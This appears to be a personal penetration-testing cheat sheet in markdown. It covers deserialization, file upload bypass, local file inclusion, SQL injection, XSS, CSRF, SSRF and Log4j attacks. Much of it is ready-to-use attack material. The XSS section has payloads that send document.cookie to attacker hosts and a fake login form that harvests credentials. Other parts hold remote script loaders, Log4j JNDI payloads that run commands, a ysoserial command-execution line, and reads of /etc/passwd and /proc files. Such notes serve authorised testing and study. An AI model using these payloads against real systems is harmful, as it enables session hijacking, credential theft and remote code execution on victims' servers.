...
### Deserialization
**Serialization** is the process of converting complex data structures into a "flatter" format that can be sent and received as a sequential stream of bytes. **Deserialization** restores the original object.

#### ASP.NET
##### ViewState

- Read `web.config` (usually `..\web.config` -> Key Values & Decryption Type
- Exploitation → [NET YSOSerial](https://medium.com/@hypri0n/run-ysoserial-exe-on-kali-linux-47b344ddff27)
	1. Run the payload, change different `-g`
		```bash
		ysoserial run "-p ViewState -g TypeConfuseDelegate -c '[CMD]' --path='/[PATH]' --validationalg='[MACHINE_KEY_VALIDATION_ATTRIBUTE]' --validationkey='[VALIDATION_KEY]' --decryptionalg='[MACHINE_KEY_DECRYPT_ATTRIBUTE]' | tr -d '\n'"
		```
	2. Check if the value calculated by the exploit is the same as the intercepted one
	3. Copy Payload → `__VIEWSTATE` Parameter → Send Request


#### Java
serialized Java objects always begin with the same bytes, which are encoded as `ac ed` in hexadecimal and `rO0` in Base64.

Whiteboxing -> Look for readObject()
...
```
Whiteboxing -> search for `unserialize()`

### File Upload

[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
```bash
fuxploider -u [URL] -T 10 --cookies "" --not-regex '' / --true-regex '' --uploads-path [/uploads/]
```

#### Find Upload Directory

- Fuzz
- Use other vulnerabilities to find the upload files by reading the web application code (e.g. php filters, SQL injection)
...
- **PDF**
  ...
  - If it is opened -> [generate malicious PDF](https://github.com/jonaslejon/malicious-pdf) /  `ntlmteft [RESP_IP]` -> `respond`
- XML / HTML / MD / CSS
  - XSS
  - XXE
  - SSRF
...
- **Back-end Filters**
 - Try harmless payload first
  ...
  - See which shell worked:
    ```bash
    ffuf -u "http://[URL]/[UPLOADS_FOLDER]/shell.pngFUZZ" -w /usr/share/wordlists/file_upload/ext_bypass.txt -mr "RCE!" -s
    ```
...
- [Linux](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt): `/usr/share/wordlists/LFI/file_inclusion_linux.txt`
	...
	- Dump processes:
		- `for i in $(seq 0 100); do [...] /proc/$i/cmdline; done`
		- `/proc/self/cmdline` -> command line used to start the process
		- `/proc/self/cwd` -> process's current working directory -> request source code
	...
	- VHOSTS -> `generate_web_paths [SERVER_TYPE] [DOMAIN]`:
		- Nginx
			- `/etc/nginx/nginx.conf` -> get `include` locations
			- `/etc/nginx/sites-enabled/default` (replace include loc)
...
- `osscan() <req. file>` -> add `FUZZ` to parameter to test
- **Linux**
  ```bash
...
# General query
sqlmap -r [query.txt] -p [PARAM_TO_TEST] --second-req {SECOND_ORDER_SQL}
...
--tamper=escapequotes,between,space2comment,equaltolike
...
1. **Find the injection**
   - The parameter is a 
	   - string -> ``' " ` ``
	   - integer -> boolean/arithmetic injection -> add `+1`
   - Second order SQL injection:
	   - Register -> add in the database a poisoned parameter
	   - Login -> Load the poisoned parameter
   - Search for a parameter value that works differently than other, e.g.  [a special user](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://0xdf.gitlab.io/2021/11/22/htb-union.html&ved=2ahUKEwjno8X9l7CPAxUxRfEDHXXuAWYQFnoECAoQAQ&usg=AOvVaw0WW9B-5GB0ROGLgKPtPSd3)
   - Look for different responses
		```bash
		ffuf -u [URL] param=[Param]FUZZ1FUZZ2 -w /usr/share/wordlists/sql_prefix.txt:FUZZ1 -w /usr/share/wordlists/sql_suff.txt:FUZZ2
		```
	- Fuzz the parameter for special characters
1. **Determine type and insert payload**
   - [Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet#database-version)
...
2. **Read the database (mysql)**
    ```sql
    # Get DB names
    select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.schemata   
    # Get tables and columns
    select group_concat(table_name, ':', column_name) from INFORMATION_SCHEMA.columns where table_schema='[DB]'
    # Read table
    select group_concat([COLUMN]) from [TABLE]
    ```
3. **Read / Write Files: (mysql)**
	- Determine User
		```sql
		SELECT USER()
		SELECT CURRENT_USER()
...
- **Types:**
  - [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) input is processed by the *backend* and displayed on the page. **Non Persistent** -> needs to be sent through a form
  - [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) (persistent or second-order XSS) input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments) -> **Persistent**: it will affect other users that visit the page
  - [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) input is processed by the *frontend* and displayed on the page. **Non Persistent** -> needs to be sent in a link 
...
##### Payloads
- Check payload syntax-> in the browser 
	- `{html} data:text/html,<script>prompt()</script>`
- Prefix
	- `{html}'"></script></title></style></textarea>`
- Body
	- Reflected / blind:
		- `{html} <img/src=x/onerror=[FUNCTION]>`
		- `{html} <script/src="data:;base64,[B64_FUNCTION]"></script>`
		- `{html} <svg/onload=eval(atob("[B64_FUNCTION]"));>`
		- polyglots
			```html
			jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=fetch('http://KALI_IP') )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=fetch('http://KALI_IP')//>\x3e
			```
			```html
			-->'"/></sCript><svG x=">" onload=(co\u006efirm)`document.domain`>
			```
			```html
			'"</script></style></title></textarea>!-→<svg/onload=confirm(document.domain)>
			```
	- Blind testing-> Function goes into `evil.js`:
		- `{html} <script src="http://[TUNIP]/evil.js"></script>`
		- `{html}<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>`
		- `{html}<script>$.getScript("http://OUR_IP")</script>`
- Functions
	- Testing
		- `{javascript}alert(window.origin)` -> B64: `YWxlcnQod2luZG93Lm9yaWdpbik=`
		- `{javascript}prompt(document.domain)` -> B64: `cHJvbXB0KGRvY3VtZW50LmRvbWFpbikK`
		- `{javascript}print()`
	- Cookie Stealing  (If `HttpOnly: False`) -> Open `httpserv 80`
		- `{javascript}fetch('http://[KALI_IP]/?c='+btoa(document.cookie));`
		- `{javascript}document.location='http://[TUNIP]/index.php?c='+document.cookie;`
		- `{javascript}new Image().src='http://[TUNIP]/index.php?c='+document.cookie;`
		- `{javascript}  xhr=new XMLHttpRequest;xhr.open("GET","http://[TUNIP]/?c="+btoa(document.cookie));xhr.send();`
	- Login Form Injection -> Open `listen 80` -> Get credentials
	  ```javascript
	  document.write('<h3>Please login to continue</h3><form action=http://[TUNIP]><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
	  ```
- Purification bypass
	- [DOMPurify](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)
- Send XSS to target
	- Persisten XSS -> no need to send
	- Blind -> no need to send -> you assume somebody will trigger it
	- GET vulnerable parameter -> send link with payload in the GET parameter
	- POST vulnerable parameter

### XSRF
Craft a url such that when a target visits it, some actions or commands are taken that the user may not have wanted to take.
- Check if sending a message with `http://[KALI_IP]` -> `listen 80` is triggered
- Send malicious request, e.g.
	- change password as get request
...
1. Test:
	...
	3. See if connects
	4. Check User-Agent -> `curl` -> you can give multiple IPs space separated
2. Request capture
	1. See if you get a connect to you IP
	2. Identify the protocol
	3. Open the server of the specific protocol (e.g. ssh_server())
3. Test the file protocol to check if it blind or not
	1. `file:///etc/passwd`
	2. Not blind -> arbitrary file read
4. Look for internal http open ports
	1. Try `127.0.0.1` and hidden ports
	2. Fuzz for ports 
	3. Fuzz for Internal IPs
5. Abuse different protocols
	1. ftp
	2. smtp
...
#### Bypassing Filters
##### Blacklist-based
- Replace `127.0.0.1` with `2130706433`, `017700000001`, or `127.1`
...
- You can embed credentials in a URL before the hostname, using the `@` character. 
	...
	- `http://localhost:80@127.0.0.1/file:///etc/passwd`
...
### Denied Request Bypass

#### Path Normalization / misrouting

##### Breaking Parser Logic

Inject the path to bypass a denied request: when there are two different servers that interpret the path not in the same way -> [Blackhat presentatin by Orange Tsai](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf)

![[Pasted image 20250910205856.png]]


### Log4j

#### Test
In any parameter try the payload:
- `${jndi:ldap://[TUNIP]/file}` -> `listen 389`

#### Exploits
1. Set up the LDAP listener 
   ```bash
   sudo java -jar ~/TOOLS/JNDI-Exploit-Kit/JNDI-Exploit-Kit.jar -L [TUNIP:1389]
   ```
2. Try to inject different commands in the parameter in the form (for linux):
`${jndi:ldap://[TUNIP]:1389/serial/CommonsCollections5/exec_unix/[cmd_B64]}`